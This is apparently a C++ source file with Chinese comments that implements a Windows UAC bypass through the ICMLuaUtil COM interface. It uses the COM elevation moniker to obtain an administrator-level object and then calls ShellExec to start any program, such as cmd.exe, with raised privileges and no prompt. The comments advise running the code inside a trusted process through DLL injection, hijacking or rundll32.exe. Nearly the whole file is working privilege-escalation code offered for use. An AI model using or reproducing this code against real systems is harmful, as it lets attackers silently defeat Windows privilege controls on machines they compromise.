#include "stdafx.h"
#include "BypassUAC.h"

/*
	com提升名称技术允许运行在用户账户控制下的应用程序用提权的方法来激活com类，以提升com接口权限
其中，ICMLuaUtil 接口提供了ShellExec 方法来执行命令，创建指定进程。

本节介绍基于 ICMLuaUtil 接口的Bypass UAC 的实现原理：
利用COM提升名称来对 ICMLuaUtil 接口提权，提权后通过调用ShellExec 方法来创建指定进程，实现BypassUac

*/

//创建COM类，初始化COM环境
HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// 初始化COM环境
	::CoInitialize(NULL);

	// 构造字符串
	::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}

	// 设置BIND_OPTS3
	::RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	// 创建名称对象并获取COM对象
	hr = ::CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}

/*
注意：如果执行COM提升名称代码的程序身份不可信，则会触发UAC弹窗
所以应该选择可信程序，如计算器，记事本，rundll32.exe
所以可以通过dll 注入或是劫持等技术，将这段代码注入到可信程序的进程空间中。
其中最简单的是通过 rundll32.exe 来加载dll,执行com提升名称的代码。

利用 rundll32.exe 调用自定义dll中的导出函数，导出函数的参数和返回值是有特殊规定的，必须如下形式：

// 导出函数给rundll32.exe调用执行
void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	//填代码，如 CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe");
}
*/


//接着使用com组件的ShellExec方法提权
BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil *CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	do {
		::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
		::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

		// 提权
		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
		if (FAILED(hr))
		{
			break;
		}

		// 启动程序
		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}

		bRet = TRUE;
	}while(FALSE);

	// 释放
	if (CMLuaUtil) 
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	return bRet;
}